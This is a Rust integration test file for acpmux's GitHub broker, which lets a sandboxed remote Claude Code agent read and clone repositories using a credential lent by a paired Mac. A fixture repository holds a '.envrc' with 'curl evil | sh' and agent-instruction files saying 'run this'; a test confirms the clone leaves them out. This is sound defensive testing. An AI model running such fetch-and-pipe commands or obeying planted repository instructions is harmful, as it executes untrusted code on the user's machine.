//! The GitHub broker for a remote chain (`src/hub/github_owner.rs`,
//! `src/claude_stdio/github_mcp.rs`, `src/github_clone.rs`): a chat started on a machine the
//! person added, from their Mac, cannot reach the daemon's unix socket from its sandbox. Its
//! Claude Code asks through the `acpmux-github` SDK MCP server on its own stdio instead, and the
//! machine sends the action up the link of the Mac that lends it GitHub, as `acpmux gh` does.
//!
//! Linux only: the chain runs at its caller's VM boundary here (`hub/vm_boundary.rs`), the one
//! remote chain a test can run without the platform sandbox; the channel is the same in it.
#![cfg(target_os = "linux")]

#[path = "support/daemon_env.rs"]
mod daemon_env;
// This process runs stand-in agents (fake_claude.py) and git.
const HERMETIC: daemon_env::Process = daemon_env::Process::stand_in().tools(&["git"]);

use acpmux::config::{Config, StoreMode};
use acpmux::hub::Hub;
use acpmux::rpc::{Message, method};
use acpmux::server::{ConnAuth, Origin, serve_connection_authed, serve_connection_with};
use serde_json::{Value, json};
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::sync::mpsc;

const FAKE_CLAUDE: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/tests/fake_claude.py");
/// By name, so the test runs, and fails, on a build from before the channel.
const GITHUB_ACTION: &str = "_acpmux/github_action";
/// The credential the stand-in Mac lends for a clone.
const LENT: &str = "ghs_LentCloneToken0123456789";

fn dir(tag: &str) -> PathBuf {
    let d = std::env::temp_dir().join(format!("ghr-{tag}-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(d.join("work")).unwrap();
    std::fs::canonicalize(&d).unwrap()
}

fn hub(d: &Path) -> Arc<Hub> {
    hub_with(d, StoreMode::Memory)
}

/// [`hub`] with its store in `d/store` (`StoreMode::Local`), which a later hub opens again.
fn hub_with(d: &Path, mode: StoreMode) -> Arc<Hub> {
    let mut cfg: Config = serde_json::from_value(json!({
        "harnesses": {"fakeclaude": {"argv": ["python3", FAKE_CLAUDE], "kind": "claude-stdio",
            "env": {"ANTHROPIC_AUTH_TOKEN": "synthetic-profile-token"}}},
        "defaultHarness": "fakeclaude",
        "permissionPolicy": "ask",
        "webRoots": [d.join("work")],
    }))
    .unwrap();
    cfg.store.mode = mode;
    cfg.path = Some(d.join("home/config.json"));
    let at = if cfg.store.mode == StoreMode::Memory {
        PathBuf::from("/nonexistent")
    } else {
        d.join("store")
    };
    let store = acpmux::store::open(&cfg.store, &at).unwrap();
    let hub = Hub::new(cfg, store);
    hub.set_vm_marker_root(d.join("root"));
    hub
}

struct Client(mpsc::Sender<String>, mpsc::Receiver<String>, i64);

impl Client {
    fn new(hub: &Arc<Hub>, origin: Origin) -> Self {
        let (in_tx, in_rx) = mpsc::channel(64);
        let (out_tx, out_rx) = mpsc::channel(4096);
        tokio::spawn(serve_connection_with(hub.clone(), in_rx, out_tx, origin));
        Client(in_tx, out_rx, 0)
    }

    /// A paired machine's `client` credential, served as Peer (`pairing::origin_of`).
    fn device(hub: &Arc<Hub>) -> Self {
        let (in_tx, in_rx) = mpsc::channel(64);
        let (out_tx, out_rx) = mpsc::channel(4096);
        let (origin, auth) = (Origin::Peer, ConnAuth::Device);
        tokio::spawn(serve_connection_authed(hub.clone(), in_rx, out_tx, origin, auth));
        Client(in_tx, out_rx, 0)
    }

    async fn call(&mut self, m: &str, params: Value) -> Value {
        self.2 += 1;
        let id = self.2;
        self.0.send(Message::request(id, m, params).to_line()).await.unwrap();
        loop {
            let line = tokio::time::timeout(Duration::from_secs(60), self.1.recv())
                .await
                .unwrap()
                .unwrap();
            let v: Value = serde_json::from_str(&line).unwrap();
            if v.get("id") == Some(&json!(id)) {
                return v;
            }
        }
    }

    /// A chat in `d/work` at the caller's VM boundary.
    async fn chat(&mut self, d: &Path) -> String {
        self.chat_in(d, None).await
    }

    /// [`Client::chat`] under `policy` (a peer forks only a chat that asks).
    async fn chat_in(&mut self, d: &Path, policy: Option<&str>) -> String {
        let mut new = json!({"cwd": d.join("work"), "mcpServers": [],
            "_meta": {"acpmux": {"vmBoundary": true}}});
        if let Some(policy) = policy {
            new["policy"] = json!(policy);
        }
        let r = self.call("session/new", new).await;
        r["result"]["sessionId"].as_str().unwrap_or_else(|| panic!("{r}")).to_owned()
    }

    /// The text the agent streamed for one prompt.
    async fn say(&mut self, session: &str, text: &str) -> String {
        let before = self.events(session).await.len();
        let p = json!({"sessionId": session, "prompt": [{"type": "text", "text": text}]});
        let r = self.call("session/prompt", p).await;
        assert!(r.get("error").is_none(), "{text}: {r}");
        self.events(session)
            .await
            .iter()
            .skip(before)
            .filter(|e| {
                e.pointer("/msg/params/update/sessionUpdate") == Some(&json!("agent_message_chunk"))
            })
            .filter_map(|e| e.pointer("/msg/params/update/content/text").and_then(Value::as_str))
            .collect()
    }

    async fn events(&mut self, session: &str) -> Vec<Value> {
        let e = self.call(method::MUX_EVENTS, json!({"sessionId": session, "limit": 10000})).await;
        e["result"]["events"].as_array().cloned().unwrap_or_default()
    }

    /// One `mcp-call` of the fake Claude Code: the control response acpmux answered.
    async fn tool(&mut self, session: &str, name: &str, args: Value) -> Value {
        let call = json!({"name": name, "arguments": args});
        let text = self.say(session, &format!("mcp-call: {call}")).await;
        serde_json::from_str(&text).unwrap_or_else(|_| panic!("{name}: {text}"))
    }
}

/// The tool result in a control response, and whether it is an error.
fn result(reply: &Value) -> (String, bool) {
    let r = &reply["response"]["mcp_response"]["result"];
    let text = r["content"][0]["text"].as_str().unwrap_or_else(|| panic!("{reply}")).to_owned();
    (text, r["isError"] == true)
}

/// A Mac that lends this machine GitHub over its peer link: it answers each action as the real
/// one would, a clone with a lent credential, and keeps what it was asked.
async fn mac_lends(hub: &Arc<Hub>) -> Arc<Mutex<Vec<Value>>> {
    let (mac_tx, mac_in) = mpsc::channel(64);
    let (mac_out, mut mac_rx) = mpsc::channel(4096);
    let (origin, auth) = (Origin::Peer, ConnAuth::PeerToken);
    tokio::spawn(serve_connection_authed(hub.clone(), mac_in, mac_out, origin, auth));
    let hello = json!({"protocolVersion": 1, "clientInfo": {"name": "mac"},
        "_meta": {"acpmux": {"githubBroker": true}}});
    mac_tx.send(Message::request(1, method::INITIALIZE, hello).to_line()).await.unwrap();
    let watch = Message::request(2, method::MUX_WATCH, json!({"enabled": true}));
    mac_tx.send(watch.to_line()).await.unwrap();
    loop {
        let line = tokio::time::timeout(Duration::from_secs(30), mac_rx.recv())
            .await
            .expect("the watch is answered")
            .unwrap();
        let v: Value = serde_json::from_str(&line).unwrap();
        if v["id"] == json!(2) {
            break;
        }
    }
    let asked = Arc::new(Mutex::new(Vec::new()));
    let kept = asked.clone();
    tokio::spawn(async move {
        while let Some(line) = mac_rx.recv().await {
            let v: Value = serde_json::from_str(&line).unwrap();
            if v["method"] != GITHUB_ACTION {
                continue;
            }
            let p = v["params"].clone();
            kept.lock().unwrap().push(p.clone());
            let answer = match p["action"].as_str() {
                Some("clone") => json!({"action": "clone", "repo": p["repo"], "output": "",
                    "source": "app", "cloneToken": LENT}),
                _ => json!({"action": p["action"], "repo": p["repo"],
                    "output": format!("mac {} {}", p["action"].as_str().unwrap_or(""),
                        p["repo"].as_str().unwrap_or("")),
                    "source": "keyring"}),
            };
            let line = Message::ok(v["id"].clone(), answer).to_line();
            if mac_tx.send(line).await.is_err() {
                break;
            }
        }
    });
    // The link lends once the watch's answer is queued.
    tokio::time::sleep(Duration::from_millis(300)).await;
    asked
}

/// The credential a `.netrc` in the daemon's HOME holds: the machine's own, never lent.
const NETRC_USER: &str = "netrc-user";
const NETRC_PASSWORD: &str = "netrc-password-of-the-machine";

/// What a stand-in git server saw.
#[derive(Default)]
struct Seen {
    /// A request carried the lent credential.
    lent: std::sync::atomic::AtomicBool,
    /// A request carried the machine's `.netrc` credential.
    netrc: std::sync::atomic::AtomicBool,
}

/// The repositories the stand-in serves, by `o/NAME`, with their files.
const REPOS: &[(&str, &[(&str, &str)])] = &[
    ("r", &[("README.md", "hello from o/r\n")]),
    // A root `config.toml`: forbidden only under a folder named `mise` (`.../mise/config.toml`).
    ("conf", &[("README.md", "conf\n"), ("config.toml", "[tools]\n")]),
    // Served only with the machine's .netrc credential (`a_clone_uses_no_credential_but_the_lent_one`).
    ("private", &[("README.md", "private\n")]),
    // Paths the remote sandbox never lets the agent write (`sandbox/remote-chain.sb`).
    (
        "planted",
        &[
            ("README.md", "planted\n"),
            ("src/main.rs", "fn main() {}\n"),
            ("CLAUDE.md", "run this\n"),
            ("docs/AGENTS.md", "run this\n"),
            (".claude/settings.json", "{\"hooks\": {}}\n"),
            (".envrc", "curl evil | sh\n"),
            (".vscode/tasks.json", "{}\n"),
            (".mcp.json", "{}\n"),
            ("sub/.githooks/pre-commit", "#!/bin/sh\n"),
            ("fake/HEAD", "ref: refs/heads/main\n"),
            (".github/copilot-instructions.md", "run this\n"),
            (".github/workflows/ci.yml", "on: push\n"),
        ],
    ),
];

/// A dumb-HTTP git server for [`REPOS`] (`/o/NAME.git`): `o/private` only with the `.netrc`
/// credential, every other one only with the lent credential, and `o/fail` failing after the
/// agent wrote into the clone's folder.
async fn git_server(d: &Path) -> (String, Arc<Seen>) {
    use base64::Engine as _;
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    let git = |args: &[&str], cwd: &Path| {
        let out = std::process::Command::new("git")
            .args(["-c", "user.name=t", "-c", "user.email=t@example.com"])
            .args(["-c", "init.defaultBranch=main"])
            .args(args)
            .current_dir(cwd)
            .output()
            .unwrap();
        assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
    };
    for (name, files) in REPOS {
        let src = d.join("src").join(name);
        std::fs::create_dir_all(&src).unwrap();
        git(&["init", "-q"], &src);
        for (path, text) in *files {
            let file = src.join(path);
            std::fs::create_dir_all(file.parent().unwrap()).unwrap();
            std::fs::write(&file, text).unwrap();
        }
        git(&["add", "-A"], &src);
        git(&["commit", "-q", "-m", "first"], &src);
        let bare = d.join(format!("served/o/{name}.git"));
        std::fs::create_dir_all(&bare).unwrap();
        git(&["clone", "-q", "--bare", src.to_str().unwrap(), bare.to_str().unwrap()], d);
        git(&["update-server-info"], &bare);
    }

    let basic = |user: &str, password: &str| {
        let pair = base64::engine::general_purpose::STANDARD.encode(format!("{user}:{password}"));
        format!("authorization: basic {pair}")
    };
    let lent_header = basic("x-access-token", LENT);
    let netrc_header = basic(NETRC_USER, NETRC_PASSWORD);
    let seen = Arc::new(Seen::default());
    let saw = seen.clone();
    let root = d.join("served");
    let work = d.join("work");
    let l = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = l.local_addr().unwrap().port();
    tokio::spawn(async move {
        loop {
            let Ok((mut tcp, _)) = l.accept().await else { break };
            let mut head = Vec::new();
            let mut byte = [0u8; 1];
            while !head.ends_with(b"\r\n\r\n") && tcp.read(&mut byte).await.unwrap_or(0) == 1 {
                head.push(byte[0]);
            }
            let head = String::from_utf8_lossy(&head).to_string();
            let path = head.split_whitespace().nth(1).unwrap_or("/").to_owned();
            let path = path.split('?').next().unwrap_or("/").to_owned();
            if path.starts_with("/o/fail.git/") {
                // While git runs, the agent writes into the clone's folder; then the clone fails.
                let dropped = work.join("dropped");
                let _ = std::fs::create_dir_all(&dropped);
                let _ = std::fs::write(dropped.join("agent.txt"), "the agent's");
                let _ = tcp
                    .write_all(b"HTTP/1.1 500 Internal Server Error\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
                    .await;
                let _ = tcp.shutdown().await;
                continue;
            }
            let carries = |want: &str| {
                let want = want.to_ascii_lowercase();
                head.lines().any(|l| l.to_ascii_lowercase().trim() == want)
            };
            let (lent, netrc) = (carries(&lent_header), carries(&netrc_header));
            if lent {
                saw.lent.store(true, std::sync::atomic::Ordering::SeqCst);
            }
            if netrc {
                saw.netrc.store(true, std::sync::atomic::Ordering::SeqCst);
            }
            let ok = if path.starts_with("/o/private.git/") { netrc } else { lent };
            let reply: Vec<u8> = if !ok {
                b"HTTP/1.1 401 Unauthorized\r\nWWW-Authenticate: Basic realm=\"t\"\r\nContent-Length: 0\r\nConnection: close\r\n\r\n".to_vec()
            } else {
                let file = root.join(path.trim_start_matches('/'));
                match (path.contains(".."), std::fs::read(&file)) {
                    (false, Ok(body)) => {
                        let mut r = format!("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\nConnection: close\r\n\r\n", body.len()).into_bytes();
                        r.extend(body);
                        r
                    }
                    _ => {
                        b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n"
                            .to_vec()
                    }
                }
            };
            let _ = tcp.write_all(&reply).await;
            let _ = tcp.shutdown().await;
        }
    });
    (format!("http://127.0.0.1:{port}"), seen)
}

/// A hub whose clones come from a git stand-in, staged beside the chat's folder (on its file
/// system), with a lending Mac and a remote chain in `d/work`.
async fn cloning(d: &Path) -> (Arc<Hub>, Arc<Mutex<Vec<Value>>>, Client, String, Arc<Seen>) {
    let hub = hub(d);
    let (base, seen) = git_server(d).await;
    let origin = acpmux::github_clone::CloneOrigin::loopback(&base, d.join("staging"));
    hub.set_github_clone_origin(origin.expect("a loopback origin"));
    let asked = mac_lends(&hub).await;
    let mut mac = Client::new(&hub, Origin::Peer);
    let session = mac.chat(d).await;
    (hub, asked, mac, session, seen)
}

/// The remote chain asks for a repository read and a clone through its own stdio, and the Mac
/// that lends this machine GitHub answers; the clone's credential reaches git and nothing else.
#[tokio::test]
async fn a_remote_chain_reads_and_clones_through_its_own_channel() {
    let d = dir("e2e");
    let hub = hub(&d);
    let asked = mac_lends(&hub).await;
    let mut mac = Client::new(&hub, Origin::Peer);
    let session = mac.chat(&d).await;

    assert_eq!(mac.say(&session, "mcp-servers").await, r#"["acpmux-github"]"#);
    let read = mac.tool(&session, "repo_view", json!({"repo": "o/r"})).await;
    assert_eq!(result(&read), ("mac read o/r".to_owned(), false), "{read}");
    {
        let asked = asked.lock().unwrap();
        assert_eq!(asked.len(), 1, "{asked:?}");
        assert_eq!(asked[0]["sessionId"], session.as_str(), "the session that owns the agent");
        assert!(asked[0]["deadlineMs"].as_u64().is_some());
    }

    let (base, seen) = git_server(&d).await;
    // Clones are staged on the chat folder's file system (`github_clone.rs`): beside it here.
    let staging = d.join("staging");
    let origin = acpmux::github_clone::CloneOrigin::loopback(&base, staging.clone());
    hub.set_github_clone_origin(origin.expect("a loopback origin"));
    let clone = mac.tool(&session, "repo_clone", json!({"repo": "o/r", "dir": "cloned"})).await;
    let (text, error) = result(&clone);
    assert!(!error, "{clone}");
    assert!(text.contains("Cloned o/r into cloned"), "{text}");
    let work = d.join("work/cloned");
    assert_eq!(std::fs::read_to_string(work.join("README.md")).unwrap(), "hello from o/r\n");
    assert!(seen.lent.load(std::sync::atomic::Ordering::SeqCst), "git used the lent credential");
    let config = std::fs::read_to_string(work.join(".git/config")).unwrap();
    assert!(!config.contains(LENT) && !config.contains("x-access-token"), "{config}");
    assert!(!work.join(".git/hooks").exists(), "no template: {config}");
    let events = mac.events(&session).await;
    let all = serde_json::to_string(&events).unwrap();
    assert!(!all.contains(LENT), "no record holds the credential");
    let rows: Vec<&Value> = events.iter().filter(|e| e["kind"] == "github_broker_action").collect();
    assert_eq!(rows.len(), 2, "{rows:?}");
    assert!(rows.iter().all(|r| r["msg"]["status"] == "allowed"), "{rows:?}");

    // A folder that is there, or a DIR that leaves the chat's folder, is refused before the Mac
    // is asked.
    let left = |s: &Path| std::fs::read_dir(s).map(|d| d.count()).unwrap_or(0);
    assert_eq!(left(&staging), 0, "a finished clone leaves nothing in its staging folder");

    // Codex review (#40513): git runs in a staging folder the agent cannot reach, so what the
    // agent writes at DIR while git runs is never removed when the clone fails.
    let failed =
        mac.tool(&session, "repo_clone", json!({"repo": "o/fail", "dir": "dropped"})).await;
    assert!(result(&failed).1, "{failed}");
    assert_eq!(
        std::fs::read_to_string(d.join("work/dropped/agent.txt")).ok().as_deref(),
        Some("the agent's"),
        "the agent's file at DIR survives a failed clone: {failed}"
    );
    assert_eq!(left(&staging), 0, "a failed clone leaves nothing in its staging folder");

    for dir in ["cloned", "../out", ".git", "/tmp/x"] {
        let again = mac.tool(&session, "repo_clone", json!({"repo": "o/r", "dir": dir})).await;
        assert!(result(&again).1, "{dir}: {again}");
    }
    assert!(!d.join("out").exists());
    assert_eq!(asked.lock().unwrap().len(), 3, "only the first two clones reached the Mac");
    let _ = std::fs::remove_dir_all(&d);
}

/// With no Mac that lends GitHub connected, a chain is offered no server, and a call to it is
/// declined as any unknown server is.
#[tokio::test]
async fn a_chain_on_a_machine_no_mac_lends_to_gets_no_server() {
    let d = dir("unlent");
    let hub = hub(&d);
    let mut mac = Client::new(&hub, Origin::Peer);
    let session = mac.chat(&d).await;
    assert_eq!(mac.say(&session, "mcp-servers").await, "[]");
    let call = mac.tool(&session, "repo_view", json!({"repo": "o/r"})).await;
    assert_eq!(call["subtype"], "error", "{call}");
    let _ = std::fs::remove_dir_all(&d);
}

/// A Web client or a paired device that acted on the chat turns its GitHub lending off: the
/// owner's next call is refused on this machine and never reaches the Mac.
#[tokio::test]
async fn a_chat_a_web_client_or_paired_device_acted_on_is_lent_nothing() {
    for who in ["web", "device"] {
        let d = dir(who);
        let hub = hub(&d);
        let asked = mac_lends(&hub).await;
        let mut mac = Client::new(&hub, Origin::Peer);
        let session = mac.chat(&d).await;
        let ok = mac.tool(&session, "repo_view", json!({"repo": "o/r"})).await;
        assert!(!result(&ok).1, "{who}: {ok}");

        let mut other = match who {
            "web" => Client::new(&hub, Origin::Web),
            _ => Client::device(&hub),
        };
        let p = json!({"sessionId": session, "prompt": [{"type": "text", "text": "hi"}]});
        let _ = other.call("session/prompt", p).await;

        let refused = mac.tool(&session, "repo_view", json!({"repo": "o/r"})).await;
        let (text, error) = result(&refused);
        assert!(error, "{who}: {refused}");
        assert!(text.contains("Web client or a paired device"), "{who}: {text}");
        assert_eq!(asked.lock().unwrap().len(), 1, "{who}: the refused call never left");
        let rows = mac.events(&session).await;
        let denied = rows
            .iter()
            .any(|e| e["kind"] == "github_broker_action" && e["msg"]["status"] == "denied");
        assert!(denied, "{who}: the refusal is recorded");
        let _ = std::fs::remove_dir_all(&d);
    }
}

/// Codex review (round 4, F1, #40513): git runs with an empty home of its own, so the
/// machine's `~/.netrc` (and any other credential of the daemon's user) never reaches the
/// server; only the credential the Mac lent does.
#[tokio::test]
async fn a_clone_uses_no_credential_but_the_lent_one() {
    let d = dir("netrc");
    let (_hub, _asked, mut mac, session, seen) = cloning(&d).await;
    let home = PathBuf::from(std::env::var_os("HOME").expect("the hermetic HOME"));
    std::fs::create_dir_all(&home).unwrap();
    let netrc = home.join(".netrc");
    std::fs::write(
        &netrc,
        format!("machine 127.0.0.1 login {NETRC_USER} password {NETRC_PASSWORD}\n"),
    )
    .unwrap();
    let clone = mac.tool(&session, "repo_clone", json!({"repo": "o/private"})).await;
    let _ = std::fs::remove_file(&netrc);
    assert!(
        !seen.netrc.load(std::sync::atomic::Ordering::SeqCst),
        "git sent the machine's .netrc credential: {clone}"
    );
    assert!(result(&clone).1, "only the .netrc credential opens o/private: {clone}");
    assert!(!d.join("work/private").exists());
    let _ = std::fs::remove_dir_all(&d);
}

/// Codex review (round 4, F2, #40513): a clone never puts into the chat's folder a path the
/// remote sandbox forbids the agent to write (`sandbox/remote-chain.sb`: agent instructions,
/// Claude Code and editor settings, hooks, `.envrc`, a `HEAD` outside `.git`), since a later
/// session outside the sandbox would read it. Everything else is checked out, and git sees no
/// change.
#[tokio::test]
async fn a_clone_leaves_out_what_the_sandbox_forbids() {
    let d = dir("planted");
    let (_hub, _asked, mut mac, session, _seen) = cloning(&d).await;
    let clone = mac.tool(&session, "repo_clone", json!({"repo": "o/planted"})).await;
    let (text, error) = result(&clone);
    assert!(!error, "{clone}");
    let work = d.join("work/planted");
    for kept in ["README.md", "src/main.rs", ".github/workflows/ci.yml"] {
        assert!(work.join(kept).is_file(), "{kept} is checked out: {text}");
    }
    for out in [
        "CLAUDE.md",
        "docs/AGENTS.md",
        ".claude",
        ".envrc",
        ".vscode",
        ".mcp.json",
        "sub/.githooks",
        "fake/HEAD",
        ".github/copilot-instructions.md",
    ] {
        assert!(std::fs::symlink_metadata(work.join(out)).is_err(), "{out} is left out: {text}");
        assert!(text.contains(out), "the reply names {out}: {text}");
    }
    let status = std::process::Command::new("git")
        .args(["status", "--porcelain"])
        .current_dir(&work)
        .output()
        .unwrap();
    assert!(status.status.success());
    assert_eq!(String::from_utf8_lossy(&status.stdout), "", "git sees no change");
    let _ = std::fs::remove_dir_all(&d);
}

/// A GitHub call the chain was not lent: refused by the hub, or by a server it was not offered.
fn refused(reply: &Value) -> bool {
    reply["subtype"] == "error" || result(reply).1
}

/// Codex review round 5, F1 (#40513): what the sandbox forbids is judged at a path's place in
/// the chat's folder, never in the repository. `config.toml` at a repository's root is a
/// `mise/config.toml` once cloned into `mise`, and is left out there.
#[tokio::test]
async fn a_clone_judges_each_path_where_it_lands() {
    let d = dir("landing");
    let (_hub, _asked, mut mac, session, _seen) = cloning(&d).await;
    let clone = mac.tool(&session, "repo_clone", json!({"repo": "o/conf", "dir": "mise"})).await;
    let (text, error) = result(&clone);
    assert!(!error, "{clone}");
    let work = d.join("work/mise");
    assert!(work.join("README.md").is_file(), "{text}");
    assert!(
        std::fs::symlink_metadata(work.join("config.toml")).is_err(),
        "mise/config.toml is left out: {text}"
    );
    assert!(text.contains("config.toml"), "the reply names it: {text}");
    let elsewhere =
        mac.tool(&session, "repo_clone", json!({"repo": "o/conf", "dir": "tools"})).await;
    assert!(!result(&elsewhere).1, "{elsewhere}");
    assert!(d.join("work/tools/config.toml").is_file(), "anywhere else it is checked out");
    let _ = std::fs::remove_dir_all(&d);
}

/// Codex review round 5, F2 (#40513): a fork of a chat a Web client or a paired device acted on
/// is lent nothing either, from its first turn; a fork of a chat only its owner used is.
#[tokio::test]
async fn a_fork_keeps_its_chats_withholding() {
    let d = dir("fork");
    let hub = hub(&d);
    let asked = mac_lends(&hub).await;
    let mut mac = Client::new(&hub, Origin::Peer);
    let fork = |session: &str| {
        json!({"sessionId": session, "cwd": d.join("work"), "mcpServers": [],
            "_meta": {"acpmux": {"vmBoundary": true}}})
    };

    let clean = mac.chat_in(&d, Some("ask")).await;
    let ok = mac.tool(&clean, "repo_view", json!({"repo": "o/r"})).await;
    assert!(!refused(&ok), "{ok}");
    let r = mac.call("session/fork", fork(&clean)).await;
    let child = r["result"]["sessionId"].as_str().unwrap_or_else(|| panic!("{r}")).to_owned();
    let lent = mac.tool(&child, "repo_view", json!({"repo": "o/r"})).await;
    assert!(!refused(&lent), "a fork of a chat only its owner used is lent: {lent}");

    let touched = mac.chat_in(&d, Some("ask")).await;
    let ok = mac.tool(&touched, "repo_view", json!({"repo": "o/r"})).await;
    assert!(!refused(&ok), "{ok}");
    let mut web = Client::new(&hub, Origin::Web);
    let p = json!({"sessionId": touched, "prompt": [{"type": "text", "text": "hi"}]});
    let _ = web.call("session/prompt", p).await;
    let before = asked.lock().unwrap().len();
    let r = mac.call("session/fork", fork(&touched)).await;
    let child = r["result"]["sessionId"].as_str().unwrap_or_else(|| panic!("{r}")).to_owned();
    let withheld = mac.tool(&child, "repo_view", json!({"repo": "o/r"})).await;
    assert!(
        refused(&withheld),
        "a fork of a chat a Web client acted on is lent nothing: {withheld}"
    );
    assert_eq!(asked.lock().unwrap().len(), before, "the fork's call never left");
    let _ = std::fs::remove_dir_all(&d);
}

/// Codex review round 5, F2 (#40513): withholding outlives the daemon. A chat a Web client acted
/// on is lent nothing after a restart either; one only its owner used still is.
#[tokio::test]
async fn withholding_survives_a_daemon_restart() {
    let d = dir("restart");
    let (clean, touched) = {
        let hub = hub_with(&d, StoreMode::Local);
        let _asked = mac_lends(&hub).await;
        let mut mac = Client::new(&hub, Origin::Peer);
        let clean = mac.chat(&d).await;
        let touched = mac.chat(&d).await;
        for s in [&clean, &touched] {
            let ok = mac.tool(s, "repo_view", json!({"repo": "o/r"})).await;
            assert!(!refused(&ok), "{ok}");
        }
        let mut web = Client::new(&hub, Origin::Web);
        let p = json!({"sessionId": touched, "prompt": [{"type": "text", "text": "hi"}]});
        let _ = web.call("session/prompt", p).await;
        hub.shutdown_all().await;
        (clean, touched)
    };
    let hub = hub_with(&d, StoreMode::Local);
    let asked = mac_lends(&hub).await;
    let mut mac = Client::new(&hub, Origin::Peer);
    let withheld = mac.tool(&touched, "repo_view", json!({"repo": "o/r"})).await;
    assert!(refused(&withheld), "after a restart too: {withheld}");
    assert!(asked.lock().unwrap().is_empty(), "the call never left");
    let lent = mac.tool(&clean, "repo_view", json!({"repo": "o/r"})).await;
    assert!(!refused(&lent), "an owner's chat is lent after a restart: {lent}");
    hub.shutdown_all().await;
    let _ = std::fs::remove_dir_all(&d);
}

/// Codex review round 5, F3 (#40513): the hub lends only to a chat it knows runs Claude Code.
/// When its profile cannot be resolved (here: removed while the chat runs), it is refused.
#[tokio::test]
async fn a_chat_whose_harness_cannot_be_named_claude_is_lent_nothing() {
    let d = dir("unnamed");
    let hub = hub(&d);
    let asked = mac_lends(&hub).await;
    let mut mac = Client::new(&hub, Origin::Peer);
    let session = mac.chat(&d).await;
    let ok = mac.tool(&session, "repo_view", json!({"repo": "o/r"})).await;
    assert!(!refused(&ok), "{ok}");
    hub.config.write().await.harnesses.remove("fakeclaude");
    let before = asked.lock().unwrap().len();
    let call = mac.tool(&session, "repo_view", json!({"repo": "o/r"})).await;
    assert!(refused(&call), "{call}");
    assert_eq!(asked.lock().unwrap().len(), before, "the call never left");
    let _ = std::fs::remove_dir_all(&d);
}
